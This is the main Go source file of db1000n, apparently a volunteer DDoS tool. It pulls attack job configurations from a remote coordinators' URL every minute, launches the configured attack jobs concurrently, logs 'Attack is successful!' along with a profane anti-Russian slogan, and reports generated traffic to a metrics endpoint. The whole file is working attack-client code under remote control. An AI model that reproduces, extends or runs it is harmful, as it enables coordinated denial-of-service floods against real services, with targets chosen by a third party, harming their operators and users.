// MIT License

// Copyright (c) [2022] [Arriven (https://github.com/Arriven)]

// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package main

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/google/uuid"

	"github.com/Arriven/db1000n/job"
	"github.com/Arriven/db1000n/logs"
	"github.com/Arriven/db1000n/metrics"
	"github.com/Arriven/db1000n/utils"
)

// Config for all jobs to run
type Config struct {
	Jobs []job.Config
}

func fetchConfig(configPath string) (*Config, error) {
	defer panicHandler()

	var configBytes []byte
	if configURL, err := url.ParseRequestURI(configPath); err == nil {
		resp, err := http.Get(configURL.String())
		if err != nil {
			return nil, err
		}

		defer resp.Body.Close()

		if resp.StatusCode < 200 || resp.StatusCode > 299 {
			return nil, fmt.Errorf("error fetching config, code %d", resp.StatusCode)
		}

		if configBytes, err = io.ReadAll(resp.Body); err != nil {
			return nil, err
		}
	} else if configBytes, err = os.ReadFile(configPath); err != nil {
		return nil, err
	}

	var config Config
	if err := json.Unmarshal(configBytes, &config); err != nil {
		fmt.Printf("error parsing json config: %v\n", err)
		return nil, err
	}

	return &config, nil
}

func dumpMetrics(l *logs.Logger, path, name, clientID string) {
	defer panicHandler()

	bytesPerSecond := metrics.Default.Read(name)
	if bytesPerSecond > 0 {
		l.Info("Атака проводиться успішно! Руський воєнний корабль іди нахуй!\n")
		l.Info("Attack is successful! Russian warship, go fuck yourself!\n")
		l.Info("The app is generating approximately %v bytes per second\n", bytesPerSecond)
		utils.ReportStatistics(int64(bytesPerSecond), clientID)
	} else {
		l.Warning("The app doesn't seem to generate any traffic, please contact your admin")
	}
	if path == "" {
		return
	}
	type metricsDump struct {
		BytesPerSecond int `json:"bytes_per_second"`
	}
	dump := &metricsDump{
		BytesPerSecond: bytesPerSecond,
	}
	dumpBytes, err := json.Marshal(dump)
	if err != nil {
		l.Warning("failed marshaling metrics: %v", err)
		return
	}
	// TODO: use proper ip
	url := fmt.Sprintf("%s?id=%s", path, clientID)
	resp, err := http.Post(url, "application/json", bytes.NewReader(dumpBytes))
	if err != nil {
		l.Warning("failed sending metrics: %v", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusAccepted {
		l.Warning("bad response when sending metrics. code %v", resp.StatusCode)
	}
}

func updateConfig(configPath, backupConfig string) (config *Config, err error) {
	configPaths := strings.Split(configPath, ",")
	for _, path := range configPaths {
		config, err = fetchConfig(path)
		if err == nil {
			return config, nil
		}
	}
	err = json.Unmarshal([]byte(backupConfig), &config)
	return config, err
}

func main() {
	var configPath string
	var backupConfig string
	var refreshTimeout time.Duration
	var logLevel logs.Level
	var help bool
	var metricsPath string
	flag.StringVar(&configPath, "c", "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.json", "path to config files, separated by a comma, each path can be a web endpoint")
	flag.StringVar(&backupConfig, "b", utils.DefaultConfig, "raw backup config in case the primary one is unavailable")
	flag.DurationVar(&refreshTimeout, "r", time.Minute, "refresh timeout for updating the config")
	flag.IntVar(&logLevel, "l", logs.Info, "logging level. 0 - Debug, 1 - Info, 2 - Warning, 3 - Error")
	flag.BoolVar(&help, "h", false, "print help message and exit")
	flag.StringVar(&metricsPath, "m", "", "path where to dump usage metrics, can be URL or file, empty to disable")
	flag.Parse()
	if help {
		flag.CommandLine.Usage()
		return
	}

	l := logs.New(logLevel)
	clientID := uuid.New().String()

	var cancel context.CancelFunc
	defer func() {
		cancel()
	}()

	for {
		config, err := updateConfig(configPath, backupConfig)
		if err != nil {
			l.Warning("fetching json config: %v\n", err)
			continue
		}

		if cancel != nil {
			cancel()
		}

		var ctx context.Context
		ctx, cancel = context.WithCancel(context.Background())
		for _, jobDesc := range config.Jobs {
			job, ok := job.Get(jobDesc.Type)
			if !ok {
				l.Warning("no such job - %s", jobDesc.Type)
				continue
			}

			if jobDesc.Count < 1 {
				jobDesc.Count = 1
			}

			for i := 0; i < jobDesc.Count; i++ {
				go job(ctx, l, jobDesc.Args)
			}
		}

		time.Sleep(refreshTimeout)
		dumpMetrics(l, metricsPath, "traffic", clientID)
	}
}

func panicHandler() {
	if err := recover(); err != nil {
		logs.Default.Warning("caught panic: %v", err)
	}
}
